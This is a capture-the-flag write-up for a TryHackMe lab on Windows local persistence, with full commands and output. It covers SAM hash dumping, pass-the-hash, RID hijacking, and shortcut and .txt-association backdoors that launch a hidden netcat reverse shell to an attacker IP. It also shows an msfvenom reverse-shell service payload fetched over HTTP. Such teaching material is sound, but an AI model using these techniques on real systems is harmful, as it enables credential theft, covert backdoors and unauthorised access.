# Room Information

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Banner%20-%20Windows%20Local%20Persistence.png)

Room link: https://tryhackme.com/room/windowslocalpersistence

**Please feel free to point out any errors that you may see in this writeup!**

This writeup was last updated: 08/16/2023

# Tampering With Privileged Accounts

## Assigning Group Memberships

1. Start this room's machine and our TryHackMe AttackBox
2. `cd \` from the compromised Windows machine to change to the their filesystem's root directory to ensure that we'll be executing the following commands from starting from there
```PowerShell
C:\Users\Administrator>cd \
```
3. `net localgroup “Backup Operators” <USER> /add` from the compromised Windows machine to add our target user (thmuser1) to the compromised system's **Backup Operators** group, which won't give our target user administrative privileges but it will allow them to read and write to files within its system regardless of the system's DACL configurations and any other set permissions that may prevent users from accessing those files
```PowerShell
C:\>net localgroup "Backup Operators" thmuser1 /add
The command completed successfully.
```
4. `net localgroup “Remote Management Users” <USER> /add` from the compromised Windows machine to add our target user (thmuser1) to the compromised system's **Remote Management Users** group in order to have our target user be able to connect back to the compromised machine using WinRM
```PowerShell
C:\>net localgroup "Remote Management Users" thmuser1 /add
The command completed successfully.
```
5. `reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v /EnableLUA` from the compromised Windows machine to check if Microsoft's UAC is active on our compromised machine and display the results onto our terminal, which ended up being the case (1 meaning that it's enabled) and therefore preventing us from running any administrative privileges when remotely connecting back to the compromised machine since it strips the user who's remotely connecting to the compromised system from any administrative privileges that they may have by disabling their access to the privileges of the groups that they're a part of that have full or certain administrator privileges, which in this case was the **Backup Operators** group
```PowerShell
C:\>reg query "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableLUA"

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
    EnableLUA    REG_DWORD    0x1
```
6. `reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1` from the compromised Windows machine to enable the compromised system's LocalAccountTokenFilterPolicy registry policy, which allowed us to disable UAC's remote restrictions and have the **Backup Operators** group's privileges enabled for our compromised user when connecting remotely to the compromised system
```PowerShell
C:\>reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
The operation completed successfully.
```
7. `evil-winrm -i <TARGET IP> -u <USER> -p <PASSWORD>` from our Linux attack machine to remotely connect to the compromised machine as our target user (thmuser1) using WinRM
```Bash
root@ip-10-10-72-227:~# evil-winrm -i 10.10.41.253 -u thmuser1 -p Password321

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\thmuser1\Documents> 
```
8. `whoami /groups` from the command line in our active WinRM session to display what groups the currently logged in user is a part of onto our terminal, which showed the **Backup Operators** group to be enabled since we enabled the LocalAccountTokenFilterPolicy registry policy on the compromised Windows machine
```bash
*Evil-WinRM* PS C:\Users\thmuser1\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes
==================================== ================ ============ ==================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators             Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users      Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                 Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account           Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288
```
9. `cd \` from the command line in our active WinRM session to change to the compromised Windows machine's filesystem root directory to ensure that we'll be executing the following commands from starting from there
```Bash
*Evil-WinRM* PS C:\Users\thmuser1\Documents> cd \
```
10. `reg save hklm\system <FILENAME1>.bak` from the command line in our active WinRM session to create and save a backup file of the compromised Windows machine's **System** registry key, which successfully created the backup file on the compromised machine
```Bash
*Evil-WinRM* PS C:\> reg save hklm\system SYSTEM.bak
The operation completed successfully.

```
11. `reg save hklm\sam <FILENAME2>.bak` from the command line in our active WinRM session to create and save a backup file of the compromised Windows machine's **SAM** registry key, which successfully created the backup file on the compromised machine
```Bash
*Evil-WinRM* PS C:\> reg save hklm\sam SAM.bak
The operation completed successfully.

```
12. `download <FILENAME1>.bak` from the command line in our active WinRM session to download the backup file of the compromised Windows machine's **System** registry key from their system onto our Linux attack machine
```Bash
*Evil-WinRM* PS C:\> download SYSTEM.bak
Info: Downloading C:\\SYSTEM.bak to SYSTEM.bak

                                                             
Info: Download successful!
```
13. `download <FILENAME2>.bak` from the command line in our active WinRM session to download the backup file of the compromised Windows machine's **SAM** registry key from their system onto our Linux attack machine
```Bash
*Evil-WinRM* PS C:\> download SAM.bak
Info: Downloading C:\\SAM.bak to SAM.bak

                                                             
Info: Download successful!
```
14. `exit` from the command line in our active WinRM session to exit our current PowerShell session on our attack machine and terminate the connection
```Bash
*Evil-WinRM* PS C:\> exit

Info: Exiting with code 0

root@ip-10-10-72-227:~# 
```
15. `ls` from our Linux attack machine to display the files and directories that are in our current working directory onto our terminal, which showed that the two backup files were indeed successfully downloaded onto our machine
```Bash
root@ip-10-10-72-227:~# ls
Desktop    Instructions  Postman  SAM.bak  SYSTEM.bak         Tools
Downloads  Pictures      Rooms    Scripts  thinclient_drives  work
```
16. `python3.9 /opt/impacket/examples/secretsdump.py -sam {FILENAME2}.bak -system {FILENAME1}.bak LOCAL` from our Linux attack machine to dump the password hashes of all the users that are in the compromised machine from its SAM registry key that we backed up into a file into Impacket's **secretsdump.py** program (https://github.com/fortra/impacket/blob/master/examples/secretsdump.py), which was already installed on our AttackBox, using both backup files that we created on and retrieved from the compromised machine and output the results onto our terminal, which ended up outputting the compromised machine's administrator's password hash which we can then use to authenticate as the administrator when remotely connecting back to the compromised machine using WinRM
```Bash
root@ip-10-10-72-227:~# python3.9 /opt/impacket/examples/secretsdump.py -sam SAM.bak -system SYSTEM.bak LOCAL 
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:f3118544a831e728781d780cfdb9c1fa:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:58f8e0214224aebc2c5f82fb7cb47ca1:::
thmuser1:1008:aad3b435b51404eeaad3b435b51404ee:f3118544a831e728781d780cfdb9c1fa:::
thmuser2:1009:aad3b435b51404eeaad3b435b51404ee:f3118544a831e728781d780cfdb9c1fa:::
thmuser3:1010:aad3b435b51404eeaad3b435b51404ee:f3118544a831e728781d780cfdb9c1fa:::
thmuser0:1011:aad3b435b51404eeaad3b435b51404ee:f3118544a831e728781d780cfdb9c1fa:::
thmuser4:1013:aad3b435b51404eeaad3b435b51404ee:8767940d669d0eb618c15c11952472e5:::
[*] Cleaning up... 
```
17. `evil-winrm -i <TARGET IP> -u Administrator -H {PASSWORD HASH}` from our Linux attack machine to perform a Pass-the-Hash (PtH) attack on the compromised machine to log in as the Administrator using their password hash, which ended up working
```Bash
root@ip-10-10-72-227:~# evil-winrm -i 10.10.41.253 -u Administrator -H f3118544a831e728781d780cfdb9c1fa

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```
18. `C:\flags\flag1.exe` from the command line in our active WinRM session to run the **flag1.exe** program, which ended up displaying this task's flag onto our terminal
```Bash
*Evil-WinRM* PS C:\Users\Administrator\Documents> C:\flags\flag1.exe
THM{FLAG_BACKED_UP!}
```


#
## Assigning Specific Privileges

1. Start this room's machine and TryHackMe's AttackBox
2. `PowerShell` from the compromised Windows machine to open up PowerShell on the compromised Windows machine
```PowerShell
C:\Users\Administrator>PowerShell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator>
```
3. `cd \` from the compromised Windows machine to change to the their filesystem's root directory to ensure that we'll be executing the following commands from starting from there
```PowerShell
PS C:\Users\Administrator> cd \
```
4. `whoami` from the compromised Windows machine to display who we're running as onto our terminal, which showed us that we were running as administrator
```PowerShell
PS C:\> whoami
wpersistence\administrator
```
5. `whoami /priv` from the compromised Windows machine to display all the privileges that the Administrator has on the compromised Windows machine, along with their descriptions, onto our terminal
```PowerShell
PS C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
SeSystemProfilePrivilege                  Profile system performance                                         Disabled
SeSystemtimePrivilege                     Change the system time                                             Disabled
SeProfileSingleProcessPrivilege           Profile single process                                             Disabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Disabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Disabled
SeBackupPrivilege                         Back up files and directories                                      Disabled
SeRestorePrivilege                        Restore files and directories                                      Disabled
SeShutdownPrivilege                       Shut down the system                                               Disabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Disabled
SeUndockPrivilege                         Remove computer from docking station                               Disabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
SeTimeZonePrivilege                       Change the time zone                                               Disabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Disabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Disabled
```
6. `secedit /export /cfg {FILENAME1}.inf` from the compromised Windows machine to export the compromised machine's security configuration as an information file (**.inf**)
```PowerShell
PS C:\> secedit /export /cfg config.inf

The task has completed successfully.
See log %windir%\security\logs\scesrv.log for detail info.
```
7. `dir` from the compromised Windows machine to verify that the compromised machine's security configuration has been successfully exported into an information file (**.inf**) onto our currently working directory within the compromised machine from where we executed the command from, which was the case
```PowerShell
PS C:\> dir


    Directory: C:\Users\Administrator


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        3/17/2021   3:13 PM                3D Objects
d-r---        3/17/2021   3:13 PM                Contacts
d-r---         6/8/2022   4:40 AM                Desktop
d-r---        5/29/2022  12:07 AM                Documents
d-r---        5/29/2022  12:07 AM                Downloads
d-r---        3/17/2021   3:13 PM                Favorites
d-r---        3/17/2021   3:13 PM                Links
d-r---        3/17/2021   3:13 PM                Music
d-r---        3/17/2021   3:13 PM                Pictures
d-r---        3/17/2021   3:13 PM                Saved Games
d-r---        3/17/2021   3:13 PM                Searches
d-r---        3/17/2021   3:13 PM                Videos
-a----         7/4/2023   2:56 AM          19318 config.inf
```
8. `notepad <FILENAME1>.inf` from the compromised Windows machine to open up the exported information file containing the compromised system's security configuration using Windows' Notepad text editor
```PowerShell
PS C:\Users\Administrator> notepad config.inf
```

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/notepad%20CONFIG.inf.png)

9. Once the file has been opened, we'll go and add our target user (thmuser2) at the end of the **SeBackupPrivilege** privilege, which allows a user or a process to bypass file system security restrictions and perform backup operations, and the **SeRestorePrivilege** privilege, which allows a user or a process to bypass file system security restrictions and perform restore operations, to assign them those privileges, which will allow them to execute the **flag2.exe** program without restrictions

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/CONFIG.inf%20Modifications.png)

10. `secedit /import /cfg <FILENAME1>.inf /db <FILENAME2>.sdb` from the compromised Windows machine to import our modified information (.inf) file containing the new security configuration for our compromised machine into a security database (.sdb) file, which will store our modified security configuration
```PowerShell
PS C:\> secedit /import /cfg config.inf /db config.sdb
```
11. `secedit /configure /db <FILENAME2>.sdb /cfg <FILENAME1>.inf` from the compromised Windows machine to override and configure their new security settings using the security database (.sdb) file we created, along with our modified information (.inf) file containing the compromised machine's modified security configuration, which ended up successfully executing
```PowerShell
PS C:\> secedit /configure /db config.sdb /cfg config.inf

The task has completed successfully.
See log %windir%\security\logs\scesrv.log for detail info.
```
12. `Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI` to display a graphical UI that'll allow us to modify the properties of the default session configuration for PowerShell remoting, which we'll do by add our target user (thmuser2) to the list of users who can remotely access PowerShell and assign them full privileges to allow them to not only access PowerShell but execute PowerShell commands as well
```PowerShell
PS C:\> Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI
WARNING: Set-PSSessionConfiguration may need to restart the WinRM service if a configuration using this name
has recently been unregistered, certain system data structures may still be cached. In that case, a restart of
 WinRM may be required.
All WinRM sessions connected to Windows PowerShell session configurations, such as Microsoft.PowerShell and
session configurations that are created with the Register-PSSessionConfiguration cmdlet, are disconnected.
```

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Configuration%20Window%20Open.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Configuration%20Window%20Add%20User.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Configuration%20Window%20Modify%20Permissions%20Zoomed%20In.png)

13. `reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA` from the compromised Windows machine to check if Microsoft's UAC is active on our compromised machine and display the results onto our terminal, which ended up being the case (1 meaning that it's enabled) and therefore preventing us from running any administrative privileges when remotely connecting back to the compromised machine since it strips the user who's remotely connecting to the compromised system from any administrative privileges that they may have by disabling their access to the privileges of the groups that they're a part of that have full or certain administrator privileges, which in this case was the **Backup Operators** group
```PowerShell
C:\>reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
    EnableLUA    REG_DWORD    0x1
```
14. `reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1` from the compromised Windows machine to enable the compromised system's LocalAccountTokenFilterPolicy registry policy, which allowed us to disable UAC's remote restrictions and have the **Backup Operators** group's privileges enabled for our compromised user when connecting remotely to the compromised system
```PowerShell
C:\>reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
The operation completed successfully.
```
15. `evil-winrm -i <TARGET IP> -u <USER> -p <PASSWORD>` from our Linux attack machine to remotely connect to the compromised machine as our target user (thmuser2) using WinRM
```Bash
root@ip-10-10-254-192:~# evil-winrm -i 10.10.56.140 -u thmuser2 -p Password321

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\thmuser2\Documents> 
```
16. `whoami /priv` from the command line in our active WinRM session to display all the privileges that the current user that we're running as (thmuser2) has on the compromised Windows machine, along with their descriptions, onto our terminal, which showed that they do indeed have the two privileges that we previous assigned to them from the compromised machine, which allowed us to execute the **flag2.exe** program without any restrictions 
 them 
```Bash
*Evil-WinRM* PS C:\Users\thmuser2\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```
17. `C:\flags\flag2.exe` to run the **flag2.exe** program, which ended up displaying this task's flag onto our terminal
```Bash
*Evil-WinRM* PS C:\Users\thmuser2\Documents> C:\flags\flag2.exe
THM{IM_JUST_A_NORMAL_USER}
```


#
## RID Hijacking

1. Start this room's machine
2. `cd \` from the compromised Windows machine to change to the their filesystem's root directory to ensure that we'll be executing the following commands from starting from there
```PowerShell
PS C:\Users\Administrator> cd \
```
3. `wmic useraccount get name,sid` from the compromised Windows machine to retrieve and display onto our terminal the names and Security Identifiers (SID) of all user accounts that are on the compromised Windows machine, for which the last bit represents the user's Relative ID (RID)
```PowerShell
PS C:\> wmic useraccount get name,sid
Name                SID
Administrator       S-1-5-21-1966530601-3185510712-10604624-500
DefaultAccount      S-1-5-21-1966530601-3185510712-10604624-503
Guest               S-1-5-21-1966530601-3185510712-10604624-501
thmuser0            S-1-5-21-1966530601-3185510712-10604624-1011
thmuser1            S-1-5-21-1966530601-3185510712-10604624-1008
thmuser2            S-1-5-21-1966530601-3185510712-10604624-1009
thmuser3            S-1-5-21-1966530601-3185510712-10604624-1010
thmuser4            S-1-5-21-1966530601-3185510712-10604624-1013
WDAGUtilityAccount  S-1-5-21-1966530601-3185510712-10604624-504
```
4. Since 
5. `cd <PSTOOLS PATH>` from the compromised Windows machine to change into where our PsExec64.exe program was in order to run the Registry Editor as SYSTEM, since in order for us to assign the Administrator's RID to our target user (thmuser3), we need to access the SAM using the Registry Editor which we won't be able to do since the SAM is restricted to the SYSTEM account only, which we currently aren't logged in as
```PowerShell
C:\>cd C:\tools\pstools
```
6. `PsExec64 -i -s regedit` from the compromised Windows machine to execute the PsExec64 command-line utility tool under the SYSTEM account, which allowed us to open the Registry Editor (**Regedit**) and manually set our target user's RID (1010) to the Administrator's RID (500), which we did by heading over to **Computer\HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Users**, opening the registry key that has our target user's RID (03F2) under hexadecimal format in its name, going inside and opening the "F" REG_BINARY file, and then finding and replacing our target user's RID (03F2), which is represented here in hexadecimal, and replacing it with the Administrator's RID (01F4) in hexadecimal format as well, and by doing so, the next time this user will connect and log in to the compromised machine, the LSASS will associate this user's RID with the Administrator's RID and it'll assign them their privileges
```PowerShell
C:\tools\pstools>PsExec64 -i -s regedit

PsExec v2.34 - Execute processes remotely
Copyright (C) 2001-2021 Mark Russinovich
Sysinternals - www.sysinternals.com
```

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Registry%20Editor%20Window%20Open.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Registry%20Editor%20thmuser3%20Window.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Registry%20Editor%20thmuser3%20Current%20RID.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Registry%20Editor%20thmuser3%20New%20RID.png)

7. `evil-winrm -i <TARGET IP> -u <USER> -p <PASSWORD>` from our Linux attack machine to remotely connect to the compromised machine as our target user (thmuser3) using WinRM, which ended up not working since our user isn't part of the **Remote Management Group** by default, so instead we'll connect to the compromised machine using RDP
```Bash
root@ip-10-10-28-182:~# evil-winrm -i 10.10.159.254 -u thmuser3 -p Password321

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

Error: An error of type WinRM::WinRMWSManFault happened, message is [WSMAN ERROR CODE: 5]: <f:WSManFault Code='5' Machine='10.10.159.254' xmlns:f='http://schemas.microsoft.com/wbem/wsman/1/wsmanfault'><f:Message>Access is denied. </f:Message></f:WSManFault>

Error: Exiting with code 1
```
8. `sudo remmina` from our Linux attack machine to launch **remmina**, which is a remote desktop client application that we'll use to remotely connect to the compromised machine using RDP, with root privileges

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Remmina%20Window%20Open.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Remmina%20Window%20RDP%20Authentication.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Remmina%20Window%20Open%20Command%20Prompt.png)

9. `whoami` from the command line in our active WinRM session to see who we've logged in as onto our terminal, which showed us that we logged in as the Administrator
```PowerShell
C:\Users\Administrator>whoami
wpersistence\administrator
```
10. `C:\flags\flag3.exe` from the command line in our active WinRM session to run the **flag3.exe** program, which ended up displaying this task's flag onto our terminal
```PowerShell
C:\Users\Administrator>C:\flags\flag3.exe
THM{TRUST_ME_IM_AN_ADMIN}
```


# Backdooring Files


## Shortcut Files

1. Started up this room's machine
2. Opened up the compromised Windows machine's calculator properties window

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Calculator%20New%20Properties.png)

3. `PowerShell` from the compromised Windows machine to open up PowerShell, which we'll then use to create a PowerShell (.ps1) script containing a payload that we'll use to connect back to our netcat listener that we'll later set up on our Linux machine, in the compromised machine's **C:\Windows\System32** directory
```PowerShell
C:\Users\Administrator>PowerShell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator>
```
3.1 `$scriptPath = 'C:\Windows\System32\<SCRIPT NAME>.ps1'`

3.2 `$scriptContent = @"`

3.3 `Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe <MACHINE IP> <PORT NUMBER>"`

3.4 `C:\Windows\System32\calc.exe`

3.5 `"@` 

3.6 `Set-Content -Path $scriptPath -Value $scriptContent`
```PowerShell
PS C:\Users\Administrator> $scriptPath = 'C:\Windows\System32\BackdoorScript.ps1'
>> $scriptContent = @"
>> Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe 10.10.210.65 9999"
>> C:\Windows\System32\calc.exe
>> "@
>> Set-Content -Path $scriptPath -Value $scriptContent
>>
```
4. Change the calculator's target path to be 'powershell.exe -WindowStyle hidden C:\Windows\System32\<SCRIPT NAME>.ps1', which will stealthly execute our payload, and change back the calculator's icon back to its default icon to ensure that the user doesn't suspect a thing, since the icon will most likely change after changing it's target path

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Calculator%20Properties%20Zoomed%20In.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Calculator%20New%20Properties.png)

5. `nc -lvnp <PORT NUMBER>`  from our Linux attack machine to set up our netcat listener that'll listen for any inbound connections
```Bash
root@ip-10-10-210-65:~# nc -lnvp 9999
Listening on [0.0.0.0] (family 0, port 9999)
```
6. Click on the calculator on the compromised Windows machine, which ended up stealthly executing our payload allowing us to create a reverse shell that connected back to our netcat listener on our attack machine

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Backdoor%20Script%20Executed%20.png)

```Bash
root@ip-10-10-210-65:~# nc -lnvp 9999
Listening on [0.0.0.0] (family 0, port 9999)
Connection from 10.10.105.224 49982 received!
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```
7. `C:\flags\flag5.exe` from our reverse shell to run the **flag5.exe** program, which ended up displaying this task's flag onto our terminal
```PowerShell
C:\Windows\system32>C:\flags\flag5.exe
C:\flags\flag5.exe
THM{NO_SHORTCUTS_IN_LIFE}
```


#
## Hijacking File Associations

1. Started this room's machine
2. `regedit` from the compromised Windows machine to open up the Registry Editor (**Regedit**), which we'll then go and later modify the data in the **Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Classes\txtfile\shell\open\command** registry, since this is what'll get executed whenever we open a **.txt** file on the compromised WIndows machine
```PowerShell
C:\Users\Administrator>regedit
```

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/regedit.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/regedit%20.txt.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/regedit%20.txt%20Zoomed%20In.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/regedit%20.txt%20pt%202.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/regedit%20.txt%20pt%202%20Zoomed%20In.png)

3. `PowerShell` from the compromised Windows machine to open up PowerShell, which we'll then use to create a PowerShell (.ps1) script containing a payload that we'll use to connect back to our netcat listener that we'll later set up on our Linux machine, in the compromised machine's **C:\Windows\System32** directory
```PowerShell
C:\Users\Administrator>PowerShell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator>
```
3.1 `$scriptPath = 'C:\Windows\System32\<SCRIPT NAME>.ps1'`
3.2 `$scriptContent = @"`
3.3 `Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe <MACHINE IP> <PORT NUMBER>"`
3.4 `C:\Windows\system32\NOTEPAD.EXE $args[0]`
3.5 `"@` 
3.6 `Set-Content -Path $scriptPath -Value $scriptContent`
```PowerShell
PS C:\Users\Administrator> $scriptPath = 'C:\Windows\System32\BackdoorScript.ps1'
>> $scriptContent = @"
>> Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe 10.10.173.81 9999"
>> C:\Windows\system32\NOTEPAD.EXE $args[0]
>> "@
>> Set-Content -Path $scriptPath -Value $scriptContent
PS C:\Users\Administrator>
```
4. We'll go back into the Registry Editor that opened up already and we'll change the **textfile**'s current value data to be `powershell.exe -WindowStyle hidden C:\Windows\System32\<SCRIPT FILE>.ps1 %1`, which will allow our backdoor script to be executed everytime a user open a text file on the compromised machine 

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Default%20Value%20Data.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/New%20Value%20Data.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/New%20Value%20Data%20pt2.png)

5. `nc -lvnp <PORT NUMBER>` from our Linux attack machine to set up our netcat listener that'll listen for any inbound connections
```Bash
root@ip-10-10-173-81:~# nc -lvnp 9999
Listening on [0.0.0.0] (family 0, port 9999)
```

6. Once our netcat listener, from the compromised Windows machine, we'll open any text file to execute our created payload, which ended up doing so and connecting back to our netcat listener on our attack machine 

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/txt%20File%20Opened.png)

```Bash
root@ip-10-10-173-81:~# nc -lvnp 9999
Listening on [0.0.0.0] (family 0, port 9999)
Connection from 10.10.141.70 49905 received!
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Administrator\Desktop>
```
7. `C:\flags\flag6.exe` from our reverse shell to run the **flag6.exe** program, which ended up displaying this task's flag onto our terminal
```PowerShell
C:\Users\Administrator\Desktop>C:\flags\flag6.exe
C:\flags\flag6.exe
THM{TXT_FILES_WOULD_NEVER_HURT_YOU}
```


# Absuing Services

## Creating Backdoor Services

1. Started this room's machine
2. `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACK MACHINE IP> LPORT=<PORT NUMBER> -f exe-service -o rev-svc.exe` from our Linux attack machine to use Metasplout's **msfvenom** to generate a Windows executable for a reverse shell payload that we'll execute on the compromised Windows machine
```Bash
root@ip-10-10-44-151:~# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.44.151 LPORT=9999 -f exe-service -o rev-svc.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe-service file: 48640 bytes
Saved as: rev-svc.exe

```
3. `sudo python3 -m http.server` from our Linux attack machine to start and transform our attack machine into a simple HTTP server that we'll connect to from our compromised machine to downlaod our payload
```bash
root@ip-10-10-44-151:~# sudo python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.254.131 - - [06/Jul/2023 01:44:11] "GET /rev-svc.exe HTTP/1.1" 200 -
```
4. `PowerShell` from the compromised Windows machine to open up PowerShell
```PowerShell
C:\Users\Administrator>PowerShell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator>
```
